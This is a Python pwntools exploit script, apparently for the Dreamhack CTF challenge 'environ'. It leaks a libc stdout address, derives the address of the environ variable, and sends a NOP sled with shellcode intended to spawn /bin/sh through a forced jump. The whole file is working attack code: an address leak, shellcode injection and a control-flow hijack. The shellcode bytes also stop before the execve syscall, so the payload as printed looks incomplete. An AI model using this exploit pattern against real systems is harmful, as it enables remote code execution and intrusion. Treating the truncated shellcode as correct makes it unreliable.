from pwn import *
context.arch = 'x86_64'
context.log_level='debug'

hosts = 'host1.dreamhack.games'
port = 10524

p = remote(hosts,port)
#p = process('./environ',env={'LD_PRELOAD':'./libc.so.6'})

elf = ELF('./environ')
libc = ELF('./libc.so.6')

environ_offset = 0x3c6f38
stdout_offset = libc.symbols['stdout']

p.recvuntil('stdout: ')
recv_stdout_addr = b'0000'+p.recvline()[2:-1]
recv_stdout_addr = int(recv_stdout_addr,16)
log.info('recv_stdout_addr : '+str(hex(recv_stdout_addr)))

libc_base = recv_stdout_addr-stdout_offset
environ_addr = libc_base+environ_offset
log.info('libc_base : '+str(hex(libc_base)))
log.info('environ : '+str(hex(environ_addr)))

shellcode = b'\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7'

payload = b'\x90'*0x118
payload += shellcode

p.sendlineafter('Size: ','1000')
p.sendlineafter('Data: ',payload)
p.sendlineafter('*jmp=',str(environ_addr))

p.interactive()
